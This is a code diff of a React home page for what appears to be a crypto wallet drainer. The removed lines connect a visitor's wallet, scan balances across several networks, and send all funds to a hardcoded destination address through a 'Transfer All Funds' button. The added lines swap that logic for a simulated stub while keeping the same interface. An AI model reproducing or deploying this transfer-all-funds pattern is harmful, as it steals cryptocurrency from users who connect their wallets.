@@ -1,127 +1,127 @@
-import { useState, useEffect } from "react";
-import { Button } from "@/components/ui/button";
-import { Wallet, Loader2, CheckCircle } from "lucide-react";
-import { useWeb3 } from "@/hooks/use-web3";
-import TransactionModal from "@/components/transaction-modal";
-import WalletConnectionModal from "@/components/wallet-connection-modal";
+import { useState } from "react";
 
 export default function Home() {
-  const { walletState, isConnecting, isLoadingNetworks, connectWallet, transferAllFundsMultiNetwork } = useWeb3();
-  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
-  const [showWalletModal, setShowWalletModal] = useState(false);
-  const [connectionError, setConnectionError] = useState<string>("");
-
-  const handleTransactionStart = (txHash: string) => {
-    setCurrentTransaction(txHash);
+  const [isConnected, setIsConnected] = useState(false);
+  const [isScanning, setIsScanning] = useState(false);
+  const [allNetworksLoaded, setAllNetworksLoaded] = useState(false);
+  const handleWalletConnect = async () => {
+    setIsScanning(true);
+    // Simulate wallet connection and network scanning
+    setTimeout(() => {
+      setIsConnected(true);
+      setIsScanning(false);
+      setTimeout(() => {
+        setAllNetworksLoaded(true);
+      }, 2000);
+    }, 1000);
   };
 
-  const handleTransactionClose = () => {
-    setCurrentTransaction(null);
+  const handleTransfer = () => {
+    alert("Transfer functionality will be implemented with Web3 integration");
   };
-
-  const handleWalletConnect = () => {
-    setShowWalletModal(true);
-    setConnectionError("");
-  };
-
-  const handleWalletModalClose = () => {
-    setShowWalletModal(false);
-    setConnectionError("");
-  };
-
-  const handleConnectAttempt = async () => {
-    try {
-      await connectWallet();
-      setShowWalletModal(false);
-      setConnectionError("");
-    } catch (error: any) {
-      setConnectionError(error.message);
-    }
-  };
-
-  const handleTransfer = async () => {
-    try {
-      const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
-      await transferAllFundsMultiNetwork(destinationAddress);
-    } catch (error) {
-      console.error("Transfer failed:", error);
-    }
-  };
-
-  // Check if all network balances are loaded
-  const allNetworksLoaded = walletState.isConnected && !isLoadingNetworks;
-  
-  // Check if user has any funds across all networks
-  const hasAnyFunds = walletState.isConnected && (
-    parseFloat(walletState.ethBalance || '0') > 0 ||
-    walletState.tokenBalances.length > 0 ||
-    walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0)
-  );
 
   return (
-    <div className="min-h-screen bg-background ethereum-gradient-subtle flex items-center justify-center">
-      <div className="flex flex-col items-center space-y-8">
+    <div style={{
+      minHeight: '100vh',
+      background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center'
+    }}>
+      <div style={{
+        display: 'flex',
+        flexDirection: 'column',
+        alignItems: 'center',
+        gap: '2rem'
+      }}>
         
         {/* Wallet Connect Button */}
-        <Button
-          onClick={walletState.isConnected ? undefined : handleWalletConnect}
-          disabled={isConnecting}
-          className={`ethereum-gradient hover:ethereum-glow-strong text-white font-semibold py-6 px-12 text-lg transition-all duration-300 ${
-            walletState.isConnected ? "ethereum-pulse" : ""
-          }`}
+        <button
+          onClick={!isConnected ? handleWalletConnect : undefined}
+          disabled={isScanning}
+          style={{
+            background: isConnected 
+              ? 'linear-gradient(135deg, #4ade80 0%, #22c55e 100%)' 
+              : 'linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%)',
+            color: 'white',
+            fontWeight: '600',
+            padding: '1.5rem 3rem',
+            fontSize: '1.125rem',
+            border: 'none',
+            borderRadius: '0.5rem',
+            cursor: isScanning ? 'not-allowed' : 'pointer',
+            opacity: isScanning ? 0.7 : 1,
+            transition: 'all 0.3s ease',
+            boxShadow: '0 0 20px rgba(59, 130, 246, 0.3)',
+            display: 'flex',
+            alignItems: 'center',
+            gap: '0.75rem'
+          }}
         >
-          <Wallet className="w-6 h-6 mr-3" />
-          {isConnecting
-            ? "Connecting..."
-            : walletState.isConnected
-            ? "Wallet Connected"
-            : "Connect Wallet"}
-        </Button>
+          <span style={{ fontSize: '1.5rem' }}>👛</span>
+          {isScanning ? "Connecting..." : isConnected ? "Wallet Connected" : "Connect Wallet"}
+        </button>
 
         {/* Network Loading Indicator */}
-        {walletState.isConnected && (
-          <div className="flex items-center space-x-3">
-            {isLoadingNetworks ? (
+        {isConnected && (
+          <div style={{
+            display: 'flex',
+            alignItems: 'center',
+            gap: '0.75rem',
+            color: '#e5e7eb'
+          }}>
+            {!allNetworksLoaded ? (
               <>
-                <Loader2 className="w-5 h-5 text-primary animate-spin" />
-                <span className="text-muted-foreground">Scanning networks...</span>
+                <div style={{
+                  width: '1.25rem',
+                  height: '1.25rem',
+                  border: '2px solid #3b82f6',
+                  borderTop: '2px solid transparent',
+                  borderRadius: '50%',
+                  animation: 'spin 1s linear infinite'
+                }} />
+                <span>Scanning networks...</span>
               </>
             ) : (
               <>
-                <CheckCircle className="w-5 h-5 text-success ethereum-pulse" />
-                <span className="text-success font-medium">All networks scanned</span>
+                <span style={{ color: '#22c55e', fontSize: '1.25rem' }}>✓</span>
+                <span style={{ color: '#22c55e', fontWeight: '500' }}>All networks scanned</span>
               </>
             )}
           </div>
         )}
 
         {/* Transfer Button */}
-        <Button
+        <button
           onClick={handleTransfer}
-          disabled={!allNetworksLoaded || !hasAnyFunds}
-          className={`ethereum-gradient-danger hover:ethereum-glow-strong text-white font-semibold py-6 px-12 text-lg transition-all duration-300 ${
-            allNetworksLoaded && hasAnyFunds ? "ethereum-pulse" : "opacity-50 cursor-not-allowed"
-          }`}
+          disabled={!allNetworksLoaded}
+          style={{
+            background: allNetworksLoaded 
+              ? 'linear-gradient(135deg, #dc2626 0%, #b91c1c 100%)' 
+              : 'linear-gradient(135deg, #6b7280 0%, #4b5563 100%)',
+            color: 'white',
+            fontWeight: '600',
+            padding: '1.5rem 3rem',
+            fontSize: '1.125rem',
+            border: 'none',
+            borderRadius: '0.5rem',
+            cursor: allNetworksLoaded ? 'pointer' : 'not-allowed',
+            opacity: allNetworksLoaded ? 1 : 0.5,
+            transition: 'all 0.3s ease',
+            boxShadow: allNetworksLoaded ? '0 0 20px rgba(220, 38, 38, 0.3)' : 'none'
+          }}
         >
           Transfer All Funds
-        </Button>
+        </button>
 
-        {/* Transaction Modal */}
-        {currentTransaction && (
-          <TransactionModal
-            txHash={currentTransaction}
-            isOpen={!!currentTransaction}
-            onClose={handleTransactionClose}
-          />
-        )}
-
-        {/* Wallet Connection Modal */}
-        <WalletConnectionModal
-          isOpen={showWalletModal}
-          onClose={handleWalletModalClose}
-          onConnect={handleConnectAttempt}
-          error={connectionError}
-        />
+        <style>
+          {`
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+          `}
+        </style>
       </div>
     </div>
   );
